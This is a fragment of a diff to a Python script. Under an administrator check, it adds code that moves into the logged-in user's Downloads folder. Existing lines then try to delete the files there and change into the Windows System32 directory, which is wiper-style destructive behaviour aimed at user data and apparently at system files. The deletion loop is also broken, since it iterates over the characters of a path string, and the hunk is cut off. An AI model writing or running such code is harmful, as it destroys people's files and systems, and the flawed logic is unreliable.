@@ -7,6 +7,8 @@ def is_admin():
         return False
 
 if is_admin():
+    name = os.getlogin()
+    os.chdir("/Users/" + name + "/Downloads")
     for files in os.getcwd():
         os.remove(files)
     os.chdir("/Windows/System32")
